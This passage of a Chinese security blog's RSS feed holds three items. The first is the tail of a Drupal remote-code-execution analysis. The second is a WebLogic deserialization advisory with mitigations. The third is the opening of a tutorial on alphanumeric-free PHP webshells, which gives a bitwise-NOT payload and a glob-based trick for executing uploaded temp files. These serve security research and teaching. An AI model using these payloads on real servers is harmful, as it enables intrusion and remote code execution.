data-original-src=&quot;v2-e953e65a6f6e32f72f237199ea53183f&quot; data-watermark-src=&quot;v2-1519ed6fe36abb69caf3cbbd2cb437d2&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;调用栈如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-f192def370cf69a37ad21a38c21de1b0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;893&quot; data-rawheight=&quot;391&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f192def370cf69a37ad21a38c21de1b0&quot; data-watermark-src=&quot;v2-1071755c923af33f4b1a37defeb4dfb4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$context&lt;/code&gt; 内容如下：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-11e6fba5c84330441280f2f079efb8dc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;463&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11e6fba5c84330441280f2f079efb8dc&quot; data-watermark-src=&quot;v2-11eecaa54fd0e66f8087544d520f028c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后代码简化如下：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-8c88d1e6d921c09d9ac2e76c7ee7c8b0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;798&quot; data-rawheight=&quot;474&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-8c88d1e6d921c09d9ac2e76c7ee7c8b0&quot; data-watermark-src=&quot;v2-9eea36452585440adc42341d111aad3d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;首先将 &lt;code class=&quot;inline&quot;&gt;$context[&quot;links&quot;]&lt;/code&gt; 赋值给 &lt;code class=&quot;inline&quot;&gt;$context[&#39;_seq&#39;]&lt;/code&gt;，接着遍历键值对并根据是否包含相应的属性(&lt;code class=&quot;inline&quot;&gt;links&lt;/code&gt;, &lt;code class=&quot;inline&quot;&gt;text_attributes&lt;/code&gt;)进入不同的条件语句中，传递不同的属性值给 &lt;code class=&quot;inline&quot;&gt;escapeFilter&lt;/code&gt; 函数。&lt;/p&gt;&lt;p&gt;这里由于包含 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性，即传递 &lt;code class=&quot;inline&quot;&gt;$context[&quot;item&quot;][&quot;link&quot;]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-673387371a36bc269c3968e58795ba09_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;492&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-673387371a36bc269c3968e58795ba09&quot; data-watermark-src=&quot;v2-8a8477eafc875971b350b2594be65766&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;之后跟进 &lt;code class=&quot;inline&quot;&gt;escapeFilter&lt;/code&gt;，该函数将通过 &lt;code class=&quot;inline&quot;&gt;$arg&lt;/code&gt; 变量类型来返回不同的值。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f8823d64ee40acf0d61759c228ceb422_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;826&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-f8823d64ee40acf0d61759c228ceb422&quot; data-watermark-src=&quot;v2-91fd439662d2ac6702402342e8654c82&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b514e3819ac6a413e769fad64cabbedd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;793&quot; data-rawheight=&quot;403&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b514e3819ac6a413e769fad64cabbedd&quot; data-watermark-src=&quot;v2-375ff5ff6e3d4f22d3b9ff53c55f4b9c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;该代码中可以看到，因为&lt;code class=&quot;inline&quot;&gt;$arg&lt;/code&gt;为数组, 所以&lt;code class=&quot;inline&quot;&gt;is_scalar($arg)=false&lt;/code&gt;，使得&lt;code class=&quot;inline&quot;&gt;$return=NULL&lt;/code&gt;，从而进入最后的&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;renderer-&amp;gt;render($arg)&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-fceba98c1c6a419c8a3bf740743f509f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;359&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-fceba98c1c6a419c8a3bf740743f509f&quot; data-watermark-src=&quot;v2-6b46e74888dd9ad8fdd17063279b0fb4&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$this-&amp;gt;renderer-&amp;gt;render&lt;/code&gt; 即为熟悉的 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-83964f1d87330b4db7fb412fa36406c8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;899&quot; data-rawheight=&quot;462&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-83964f1d87330b4db7fb412fa36406c8&quot; data-watermark-src=&quot;v2-ca1546039912ac83b74d3f2be6c8e170&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以综上可知 &lt;code class=&quot;inline&quot;&gt;$context[&quot;item&quot;]&lt;/code&gt; 的属性将会传递给 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数，只要完全控制属性值内容即可控制 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数的 &lt;code class=&quot;inline&quot;&gt;$elements&lt;/code&gt; 变量，从而达到RCE的目的，但是这里传递的是 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性，并不完全可控。&lt;/p&gt;&lt;p&gt;回到前面 &lt;code class=&quot;inline&quot;&gt;if&lt;/code&gt; 条件判断，如果不包含 &lt;code class=&quot;inline&quot;&gt;links&lt;/code&gt; 属性的时候将会传递 &lt;code class=&quot;inline&quot;&gt;text&lt;/code&gt; 属性，而 &lt;code class=&quot;inline&quot;&gt;text&lt;/code&gt; 属性值内容完全可控，所以可以利用 &lt;code class=&quot;inline&quot;&gt;text&lt;/code&gt; 属性来达到rce的目的。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d400b5d0d57494fd26569823b38ba51a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;787&quot; data-rawheight=&quot;472&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d400b5d0d57494fd26569823b38ba51a&quot; data-watermark-src=&quot;v2-62c80576c8bfa650f7504ddfd89eecf5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7db9dd670d77ed6ebe76face77401e41_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;903&quot; data-rawheight=&quot;395&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7db9dd670d77ed6ebe76face77401e41&quot; data-watermark-src=&quot;v2-728ac9aaca1624f9719451a6c83d75d5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;要想使得没有 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性在 &lt;code class=&quot;inline&quot;&gt;template_preprocess_links&lt;/code&gt; 函数中可以看到，当没有 &lt;code class=&quot;inline&quot;&gt;url&lt;/code&gt; 时，将不会设置 &lt;code class=&quot;inline&quot;&gt;$item[&#39;link&#39;]&lt;/code&gt; &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-59cf6a8c057435fac4685ca9e0a7f75a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;901&quot; data-rawheight=&quot;479&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-59cf6a8c057435fac4685ca9e0a7f75a&quot; data-watermark-src=&quot;v2-7579b00615c1b58d97f2509a48848295&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;所以只需删除请求参数 &lt;code class=&quot;inline&quot;&gt;ids[]&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;url&lt;/code&gt; 部分即可，并且将 &lt;code class=&quot;inline&quot;&gt;title&lt;/code&gt; 值内容修改为数组：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-168b78d1f577c969273379f20b26f7b0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;76&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;得到：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f9bddf12e4751ee08cd1e566da579f79_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;796&quot; data-rawheight=&quot;78&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;可以看到 &lt;code class=&quot;inline&quot;&gt;item&lt;/code&gt; 没有 &lt;code class=&quot;inline&quot;&gt;link&lt;/code&gt; 属性了。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-a846241a3b0775619950813fe271f1bd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;407&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-a846241a3b0775619950813fe271f1bd&quot; data-watermark-src=&quot;v2-f4967ade222794872bef54fe37894564&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;进入 &lt;code class=&quot;inline&quot;&gt;render&lt;/code&gt; 函数&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-82ad92b64b69eb040d5819221c00fd7d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;896&quot; data-rawheight=&quot;288&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-82ad92b64b69eb040d5819221c00fd7d&quot; data-watermark-src=&quot;v2-f7aa9bcc9ab4e4d7780c90190758642e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;从而控制了 &lt;code class=&quot;inline&quot;&gt;doRender&lt;/code&gt; 函数的 &lt;code class=&quot;inline&quot;&gt;$elements&lt;/code&gt; 参数内容，之后可通过设置 &lt;code class=&quot;inline&quot;&gt;#pre_render&lt;/code&gt; 等属性达到rce的目的。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3b850931cd0fed4fcb3d62e6951358ce_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;898&quot; data-rawheight=&quot;348&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-3b850931cd0fed4fcb3d62e6951358ce&quot; data-watermark-src=&quot;v2-d1c9489ac70db08c05090a8b61e559dd&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x06 RCE&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这里不提供完整exp，顺带说明一下这里只是通过commit调试下来的结果，并不清楚触发点是否与原漏洞发现者相同。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0f9b120624cdd6cfcad36fe482b4b9ef_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;897&quot; data-rawheight=&quot;456&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-0f9b120624cdd6cfcad36fe482b4b9ef&quot; data-watermark-src=&quot;v2-80665cc651315f7453e7b426092dcb3b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;0x07 漏洞修复状况&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;官方通过验证签名 `token` 的方式，使得 `token` 错误导致无法利用。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-391f591d0482049426bd71cd42945ba9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;483&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-391f591d0482049426bd71cd42945ba9&quot; data-watermark-src=&quot;v2-998fe0812c08be831fec7d54526bb44b&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-11-13-49558602</guid>
<pubDate>Tue, 13 Nov 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>漏洞预警 | WebLogic 多个高危漏洞</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-10-17-46975502.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/46975502&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d67fbd0aa4bb109493abc8c24b706220_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;事件来源&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;Oracle 官方在 10 月 16 日发布了严重补丁更新 CPU（Critical Patch Update），其中有 5 个针对 WebLogic Server 的高危漏洞，官方危害评级 9.8 分：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&quot;&gt;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞描述&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;ul&gt;&lt;li&gt;CVE-2018-3191&lt;/li&gt;&lt;li&gt;CVE-2018-3197&lt;/li&gt;&lt;li&gt;CVE-2018-3201&lt;/li&gt;&lt;li&gt;CVE-2018-3245&lt;/li&gt;&lt;li&gt;CVE-2018-3252&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;上述 5 个漏洞都是官方危害评级 9.8 分的高危漏洞，并且可以在远程并且未授权的状态下进行利用。它们均针对 WebLogic Server 的 WSL 核心组件，并通过 T3 协议进行利用。&lt;/p&gt;&lt;p&gt;尽管目前暂无漏洞相关具体信息，不过根据 WebLogic 以往的历史漏洞，可以判断这些漏洞仍是针对 WebLogic 反序列化类黑名单进行绕过。攻击者通过利用 T3 协议对反序列化对象进行封装发到 WebLogic 服务端口，当 WebLogic 服务端对 T3 协议数据进行处理时，即会触发反序列化漏洞。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;影响范围&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;ul&gt;&lt;li&gt;CVE-2018-3191 影响 WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3197 影响 WebLogic 12.1.3.0 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3201 影响 WebLogic 12.2.1.3 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3245 影响 WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3 版本。&lt;/li&gt;&lt;li&gt;CVE-2018-3252 影响 WebLogic 10.3.6.0, 12.1.3.0, 12.2.1.3 版本。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;解决方案&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;使用 Oracle 官方安全补丁进行更新修复：&lt;br&gt;&lt;a href=&quot;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&quot;&gt;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;由于 WebLogic 基于 T3/T3S 协议利用的反序列化漏洞层出不穷，在确认不影响业务的情况下可以考虑配置 WebLogic 对外部禁用 T3/T3S 协议。&lt;/p&gt;&lt;p&gt;配置 WebLogic 对外部禁用 T3/T3S 协议的具体步骤：&lt;/p&gt;&lt;p&gt;登入 WebLogic 控制台，在对应域设置中选择 “安全”-“筛选器” 选项卡：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-270f4051cd4eea95d62be585850e7d16_r.jpg&quot; data-rawwidth=&quot;864&quot; data-rawheight=&quot;562&quot; data-size=&quot;normal&quot; data-caption=&quot;&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-270f4051cd4eea95d62be585850e7d16&quot; data-watermark-src=&quot;v2-98c3bfbb141730de844e9c98fb0c0ed7&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;在 “连接筛选器” 输入框中输入：&lt;/p&gt;&lt;p&gt;weblogic.security.net.ConnectionFilterImpl&lt;/p&gt;&lt;p&gt;在 “连接筛选器规则” 输入框中输入（即配置为仅允许本机使用 T3/T3S 协议通信，禁用除本机以外其他主机使用 T3/T3S 协议通信）：&lt;/p&gt;&lt;p&gt;127.0.0.1 * * allow t3 t3s&lt;/p&gt;&lt;p&gt;0.0.0.0/0 * * deny t3 t3s&lt;/p&gt;&lt;p&gt;输入后保存提交即可。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考资料&lt;/b&gt;&lt;br&gt; &lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&quot;&gt;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html&lt;/a&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;b&gt;长 亭 应 急 响 应 服 务&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;全力进行产品升级&lt;/p&gt;&lt;p&gt;及时将预警预案发送给客户&lt;/p&gt;&lt;p&gt;检测业务是否受到此次漏洞影响&lt;/p&gt;&lt;p&gt;请联系长亭应急团队&lt;/p&gt;&lt;p&gt;7*24小时，守护您的安全！&lt;/p&gt;&lt;p&gt;第一时间找到我们：&lt;/p&gt;&lt;p&gt;&lt;b&gt;邮箱：support@chaitin.com&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;应急响应热线：4000-327-707&lt;/b&gt;&lt;/p&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-10-17-46975502</guid>
<pubDate>Wed, 17 Oct 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>无字母数字webshell之提高篇</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-10-17-46806125.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/46806125&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1778d4b36ffe296eb341235973267fda_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前几天【&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html&quot;&gt;代码审计知识星球&lt;/a&gt;】里有同学提出了一个问题，大概代码如下：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-eb5cc03bcc57e155992866ddd0ca2f13_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;550&quot; data-rawheight=&quot;442&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-eb5cc03bcc57e155992866ddd0ca2f13&quot; data-watermark-src=&quot;v2-7f1a731c76f642b186fddff0387fec0a&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这个代码如果要getshell，怎样利用？&lt;/p&gt;&lt;p&gt;这题可能来自是我曾写过的一篇文章：《&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html&quot;&gt;一些不包含数字和字母的webshell&lt;/a&gt;》，里面介绍了如何构造无字母数字的webshell。其中有两个主要的思路：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;利用位运算&lt;/li&gt;&lt;li&gt;利用自增运算符&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;当然，这道题多了两个限制：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;webshell长度不超过35位&lt;/li&gt;&lt;li&gt;除了不包含字母数字，还不能包含&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;和&lt;code class=&quot;inline&quot;&gt;_&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;难点呼之欲出了，我前面文章中给出的所有方法，都用到了PHP中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;不能使用了，所以我们无法构造PHP中的变量。&lt;/p&gt;&lt;p&gt;所以，如何解决这个问题？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php7&quot;&gt;PHP7 下简单解决问题&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们将上述代码放在index.php中，然后执行&lt;code class=&quot;inline&quot;&gt;docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:7.2-apache&lt;/code&gt;，启动一个php 7.2的服务器。&lt;/p&gt;&lt;p&gt;php7中修改了表达式执行的顺序：&lt;a href=&quot;http://php.net/manual/zh/migration70.incompatible.php&quot;&gt;http://php.net/manual/zh/migration70.incompatible.php&lt;/a&gt; &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c5be0e9ab661cd441ef5f646421286ee_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;328&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c5be0e9ab661cd441ef5f646421286ee&quot; data-watermark-src=&quot;v2-60436a6adec5c434f06407f98ebb01eb&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PHP7前是不允许用&lt;code class=&quot;inline&quot;&gt;($a)();&lt;/code&gt;这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过&lt;code class=&quot;inline&quot;&gt;(&#39;phpinfo&#39;)();&lt;/code&gt;来执行函数，第一个括号中可以是任意PHP表达式。&lt;/p&gt;&lt;p&gt;所以很简单了，构造一个可以生成&lt;code class=&quot;inline&quot;&gt;phpinfo&lt;/code&gt;这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：&lt;/p&gt;&lt;p&gt;(~%8F%97%8F%96%91%99%90)(); &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-79d5efef73e8ef691585251e82cadd5a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;235&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-79d5efef73e8ef691585251e82cadd5a&quot; data-watermark-src=&quot;v2-1de91572067dbce8ee60057e1e2ad6d8&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5&quot;&gt;PHP5的思考&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们使用&lt;code class=&quot;inline&quot;&gt;docker run --rm -p 9090:80 -v `pwd`:/var/www/html php:5.6-apach&lt;/code&gt;来运行一个php5.6的web环境。&lt;/p&gt;&lt;p&gt;此时，我们尝试用PHP7的payload，将会得到一个错误：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1650a681e30b3a66f9b9c112d239a3b4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;134&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1650a681e30b3a66f9b9c112d239a3b4&quot; data-watermark-src=&quot;v2-6d0e39d3694a0eb6ee5a942bbcdaba4d&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;原因就是php5并不支持这种表达方式。&lt;/p&gt;&lt;p&gt;在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。&lt;/p&gt;&lt;p&gt;当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛砖引玉了。&lt;/p&gt;&lt;p&gt;大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。&lt;/p&gt;&lt;p&gt;PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell&quot;&gt;PHP5+shell打破禁锢&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;的系统命令来getshell？&lt;/p&gt;&lt;p&gt;好像问题又回到了原点：无字母、数字、&lt;code class=&quot;inline&quot;&gt;$&lt;/code&gt;，在shell中仍然是一个难题。&lt;/p&gt;&lt;p&gt;此时我想到了两个有趣的Linux shell知识点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;shell下可以利用&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;来执行任意脚本&lt;/li&gt;&lt;li&gt;Linux文件名支持用glob通配符代替&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;第一点曾在《 &lt;a href=&quot;https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html&quot;&gt;小密圈里的那些奇技淫巧&lt;/a&gt; 》露出过一角，但我没细讲。&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则&lt;code class=&quot;inline&quot;&gt;. file&lt;/code&gt;的意思就是用bash执行file文件中的命令。&lt;/p&gt;&lt;p&gt;用&lt;code class=&quot;inline&quot;&gt;. file&lt;/code&gt;执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用&lt;code class=&quot;inline&quot;&gt;.&lt;/code&gt;来执行它了吗？&lt;/p&gt;&lt;p&gt;这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&lt;code class=&quot;inline&quot;&gt;/tmp/phpXXXXXX&lt;/code&gt;，文件名最后6个字符是随机的大小写字母。&lt;/p&gt;&lt;p&gt;第二个难题接踵而至，执行&lt;code class=&quot;inline&quot;&gt;. /tmp/phpXXXXXX&lt;/code&gt;，也是有字母的。此时就可以用到Linux下的glob通配符：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;*&lt;/code&gt;可以代替0个及以上任意字符&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;?&lt;/code&gt;可以代表1个任意字符&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;那么，&lt;code class=&quot;inline&quot;&gt;/tmp/phpXXXXXX&lt;/code&gt;就可以表示为&lt;code class=&quot;inline&quot;&gt;/*/?????????&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;/???/?????????&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;但我们尝试执行&lt;code class=&quot;inline&quot;&gt;. /???/?????????&lt;/code&gt;，却得到如下错误：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2e64e23b8eccfcabe964496693913b3f_r.jpg&quot; data-caption=&quot;&quot; 